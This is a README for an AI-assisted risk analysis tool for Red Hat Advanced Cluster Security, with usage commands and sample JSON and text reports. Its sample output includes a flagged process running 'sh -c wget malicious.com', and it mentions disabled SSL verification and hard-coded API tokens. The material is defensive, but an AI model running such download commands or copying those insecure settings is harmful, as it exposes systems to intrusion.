# RHACS Risk Prioritization with AI

This project provides AI-powered risk analysis for Red Hat Advanced Cluster Security (RHACS) deployments. It reassesses suspicious processes and CVEs to provide more accurate risk prioritization.

## Features

- **Exploit Maturity Analysis**: Checks CVEs against CISA KEV, ExploitDB, and Metasploit to determine if exploits exist "in the wild"
  - CISA KEV: Known exploited vulnerabilities
  - Metasploit: Weaponized exploit modules
  - ExploitDB: Public proof-of-concept code
  - NVD: Exploit-related references
- **Suspicious Process Reassessment**: Analyzes processes flagged by RHACS anomaly detection and classifies them as HIGH, MEDIUM, or LOW risk based on actual behavior
- **CVE Applicability Analysis**: Reassesses CVEs based on runtime environment AND exploit maturity to determine actual risk
- **AI-Powered Risk Scoring**: Generates an overall risk priority score (0-100) considering:
  - Known exploited CVEs (highest priority)
  - Weaponized CVEs with Metasploit modules
  - Applicable high-severity CVEs
  - High-risk processes
  - Deployment exposure
- **Human-Readable Reports** (NEW): Generates clear, actionable reports with:
  - Executive summaries for leadership
  - Visual severity indicators (🔴/🟠/🟡/🟢)
  - Categorized findings (Critical → Info)
  - Prioritized recommendations
  - Plain-language explanations
- **Detailed Explanations**: Provides clear reasoning for all risk classifications considering both exploit maturity and runtime context

## Installation

1. Ensure you have Python 3.7+ installed
2. Install required dependencies:

```bash
pip install requests urllib3
```

## Usage

### Using the Claude Code Skill

The easiest way to use this tool is through the Claude Code skill:

```bash
/rhacs-risk-analysis <deployment-id>
```

For example:
```bash
/rhacs-risk-analysis abc123-def456-ghi789
```

This will:
1. Fetch deployment data from RHACS
2. Analyze suspicious processes and classify risk levels
3. Reassess CVEs for applicability in the runtime environment
4. Generate a comprehensive `risk.json` output file
5. Display a summary of findings

### Using the Python Script Directly

You can also use the Python analyzer script directly:

```bash
# List all deployments
python3 rhacs_analyzer.py list

# Fetch deployment details
python3 rhacs_analyzer.py fetch <deployment-id>

# Analyze deployment (basic - no exploit checking)
python3 rhacs_analyzer.py analyze <deployment-id>

# Analyze with exploit maturity checking (recommended)
python3 rhacs_analyzer.py analyze <deployment-id> --exploits

# Check specific CVEs for exploit maturity
python3 exploit_checker.py CVE-2021-44228 CVE-2019-0708
```

The Python script fetches data from RHACS and optionally checks exploit maturity. For full AI-powered analysis with recommendations, use the Claude Code skill.

## Output Format

The skill generates two outputs:

### 1. risk.json (Machine-Readable)
For automation and tooling integration:


```json
{
  "deploymentId": "...",
  "deploymentName": "...",
  "namespace": "...",
  "cluster": "...",
  "analysisTimestamp": "2026-04-09T...",
  
  "genAIPriority": 75,
  "genAIPriorityExplanation": "High priority due to...",
  
  "suspiciousProcessExecutions": [
    {
      "processName": "sh",
      "processArgs": "sh -c wget malicious.com",
      "processPath": "/bin/sh",
      "originalRiskScore": 5.0,
      "genAIClassification": "HIGH",
      "genAIExplanation": "Process attempts to download from external source..."
    }
  ],
  
  "imageVulnerabilities": [
    {
      "cve": "CVE-2024-1234",
      "severity": "CRITICAL",
      "cvss": 9.8,
      "component": "openssl",
      "fixedBy": "1.1.1k",
      "genAIUpdatedCVSS": 7.5,
      "genAIMessage": "CVSS reduced because exploitation requires..."
    }
  ],
  
  "riskFactors": {
    "criticalCVEsApplicable": 2,
    "highRiskProcesses": 1,
    "networkExposure": "PUBLIC",
    "privilegedContainer": true,
    "hostMounts": false
  },
  
  "recommendations": [
    "Update openssl to version 1.1.1k or later",
    "Investigate suspicious wget process execution"
  ]
}
```

### 2. risk_report.txt (Human-Readable)
For security teams and stakeholders:

```
════════════════════════════════════════════════════════════════════════
EXECUTIVE SUMMARY
════════════════════════════════════════════════════════════════════════

Deployment:  payment-api
Namespace:   production
Cluster:     prod-cluster-us-east

────────────────────────────────────────────────────────────────────────
RISK ASSESSMENT
────────────────────────────────────────────────────────────────────────

🟠 HIGH Overall Risk Priority: 85/100 (HIGH)

Risk Assessment:
  HIGH priority due to CVE-2021-44228 (Log4Shell) being actively exploited
  in the wild according to CISA KEV. This deployment uses log4j-core 2.14.1
  which is vulnerable. IMMEDIATE action required.

────────────────────────────────────────────────────────────────────────
KEY FINDINGS
────────────────────────────────────────────────────────────────────────

📦 Vulnerabilities:
   • Total CVEs: 3
   • High Severity (CVSS ≥ 7.0): 3
   ⚠️  ACTIVELY EXPLOITED Known Exploited: 1

⚙️  Processes:
   • Total Processes: 3
   • Flagged as Suspicious: 2

────────────────────────────────────────────────────────────────────────
TOP RECOMMENDATIONS
────────────────────────────────────────────────────────────────────────

1. URGENT: Update log4j-core to version 2.17.1 or later
2. IMMEDIATE: Investigate wget process execution
3. URGENT: Implement WAF rules to block Log4Shell exploitation

See risk_report.txt for full details.
```

Generate the report with:
```bash
python3 report_generator.py risk.json
```

## Risk Classification Guide

### Process Risk Levels

- **HIGH**: Suspicious operations indicating risky behavior
  - Modifying sensitive configuration files
  - Accessing credentials or secrets
  - Network scanning or reconnaissance
  - Privilege escalation attempts
  - Cryptocurrency mining activities
  
- **MEDIUM**: Potentially suspicious but context-dependent
  - Unusual network connections
  - Non-standard file access patterns
  - Uncommon administrative operations
  
- **LOW**: Unrisky and exempt operations
  - Reading log files
  - Standard health check operations
  - Normal administrative tasks

### CVE Reassessment with Exploit Maturity

CVEs are reassessed based on:
- **Exploit Maturity** (NEW - highest priority):
  - Known exploited (CISA KEV) - Confirmed in-the-wild exploitation
  - Weaponized (Metasploit) - Ready-to-use exploit modules
  - Public PoC (ExploitDB) - Proof-of-concept code available
  - Maturity score: 0-100 (CRITICAL/HIGH/MEDIUM/LOW/THEORETICAL)
- **Attack Prerequisites**: What conditions must exist for exploitation
- **Runtime Environment**: Whether those conditions are present
- **Mitigating Controls**: Existing security controls that reduce risk
- **Actual Exploitability**: Real-world vs. theoretical severity

**Example**: A CVE with CVSS 9.8 but exploit maturity "THEORETICAL" (no known exploits) is deprioritized below a CVE with CVSS 7.0 but exploit maturity "HIGH" (known exploited in the wild).

## Configuration

The RHACS API endpoint and credentials are configured in:
- Skill file: `rhacs-risk-analysis.md`
- Python script: `rhacs_analyzer.py`

To use a different RHACS instance, update the `RHACS_URL` and `API_TOKEN` in both files.

## How It Works

1. **Data Collection**: Fetches deployment details, risk data, and vulnerabilities from RHACS API
2. **Process Analysis**: For each suspicious process:
   - Examines the process command, path, and behavior
   - Analyzes context (files accessed, network activity, privileges)
   - Classifies risk level with detailed explanation
3. **CVE Analysis**: For each significant CVE:
   - Extracts exploitation prerequisites from CVE database
   - Checks if prerequisites exist in runtime environment
   - Adjusts CVSS score if attack complexity increases
4. **Risk Scoring**: Calculates overall priority considering:
   - Applicable high-severity CVEs (post-reassessment)
   - High-risk processes (post-reassessment)
   - Deployment exposure and security posture
5. **Output Generation**: Creates comprehensive JSON report with all findings

## Example Workflow

```bash
# 1. List deployments to find the one you want to analyze
python rhacs_analyzer.py list | jq '.[] | {id, name, namespace}'

# 2. Run AI-powered analysis using Claude Code skill
/rhacs-risk-analysis d8f7a9b2-3c4e-5f6a-7b8c-9d0e1f2a3b4c

# 3. Review the generated risk.json file
cat risk.json | jq .genAIPriorityExplanation

# 4. Review high-risk processes
cat risk.json | jq '.suspiciousProcessExecutions[] | select(.genAIClassification == "HIGH")'

# 5. Review reassessed CVEs
cat risk.json | jq '.imageVulnerabilities[] | select(.genAIUpdatedCVSS < .cvss)'
```

## Limitations

- CVE reassessment focuses on vulnerabilities with CVSS >= 7.0 by default
- Analysis quality depends on available deployment metadata
- Some RHACS API endpoints may require specific permissions
- Demo environment uses self-signed certificates (SSL verification disabled)

## Contributing

To extend or modify the analysis:

1. Edit `rhacs-risk-analysis.md` to change the skill behavior
2. Edit `rhacs_analyzer.py` to modify data collection or parsing
3. Add custom risk factors or classification rules as needed

## License

This project is provided as-is for use with Red Hat Advanced Cluster Security.
